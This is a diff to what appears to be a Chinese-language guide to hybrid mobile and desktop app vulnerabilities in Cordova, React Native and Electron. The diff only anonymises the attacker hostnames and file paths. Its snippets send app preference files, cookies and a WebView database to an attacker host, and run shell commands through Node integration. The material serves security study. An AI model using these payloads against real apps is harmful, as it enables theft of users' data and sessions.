@@ -37,7 +37,7 @@ window.resolveLocalFileSystemURL('file:///data/data/com.target.app/shared_prefs/
             var reader = new FileReader();
             reader.onloadend = function() {
                 // 外带文件内容
-                fetch('https://attacker.com/exfil?data=' +
+                fetch('https://<attacker-domain>/exfil?data=' +
                     encodeURIComponent(this.result));
             };
             reader.readAsText(file);
@@ -50,7 +50,7 @@ window.resolveLocalFileSystemURL('file:///data/data/com.target.app/shared_prefs/
 // 将任意文件上传到攻击者服务器
 var ft = new FileTransfer();
 ft.upload('file:///data/data/com.target.app/databases/webview.db',
-    'https://attacker.com/upload',
+    'https://<attacker-domain>/upload',
     function(result) { console.log('Upload success'); },
     function(err) { console.log('Upload error'); },
     { fileKey: 'file', fileName: 'webview.db' }
@@ -65,7 +65,7 @@ ref.addEventListener('loadstop', function() {
     ref.executeScript({
         code: 'document.cookie'
     }, function(values) {
-        fetch('https://attacker.com/leak?cookies=' +
+        fetch('https://<attacker-domain>/leak?cookies=' +
             encodeURIComponent(values[0]));
     });
 });
@@ -163,7 +163,7 @@ class CordovaConfigScanner:
 // 但通过 executeScript 桥接
 
 // 攻击链:
-// 1. 应用打开 https://attacker.com/exploit.html 在 InAppBrowser 中
+// 1. 应用打开 https://<attacker-domain>/exploit.html 在 InAppBrowser 中
 // 2. exploit.html 在 InAppBrowser 中运行
 // 3. exploit.html 通过 custom scheme 或 postMessage 与主应用通信
 // 4. 主应用的 bridge 暴露更多敏感操作
@@ -203,7 +203,7 @@ NativeModules.CallLog?.getLogs();
 // 漏洞 2: NativeModules 参数注入
 // 如果原生模块接受字符串参数并直接传给原生 API:
 NativeModules.IntentLauncher?.startActivity('android.intent.action.VIEW',
-    'https://attacker.com/phish', {});
+    'https://<attacker-domain>/phish', {});
 
 // 漏洞 3: TurboModules (React Native 0.68+)
 // 同步调用 → 可在任意时刻调用 → 绕过许多保护
@@ -427,7 +427,7 @@ def find_flutter_endpoints(snapshot_or_binary_path):
 
 // 如果 nodeIntegration: true → 页面 JS 可直接使用 require():
 // require('child_process').execSync('id');
-// require('fs').readFileSync('/etc/passwd', 'utf8');
+// require('fs').readFileSync('<sensitive-file>', 'utf8');
 // require('electron').remote.getCurrentWindow();
 
 // 更常见的漏洞: nodeIntegration 关闭但 contextIsolation 关闭
@@ -442,7 +442,7 @@ def find_flutter_endpoints(snapshot_or_binary_path):
 // });
 
 // 页面 JS:
-// window.electronAPI.readConfig('/etc/passwd')
+// window.electronAPI.readConfig('<sensitive-file>')
 // window.electronAPI.exec('whoami')
 ```
 
@@ -459,7 +459,7 @@ def find_flutter_endpoints(snapshot_or_binary_path):
 // });
 
 // 页面 JS — shell 对象被直接暴露:
-// window.api.shell.openExternal('file:///etc/passwd')
+// window.api.shell.openExternal('file://<sensitive-file>')
 
 // 漏洞 2: prototype pollution via contextBridge
 // 如果 preload.js 中使用了 Object.assign 或扩展操作符:
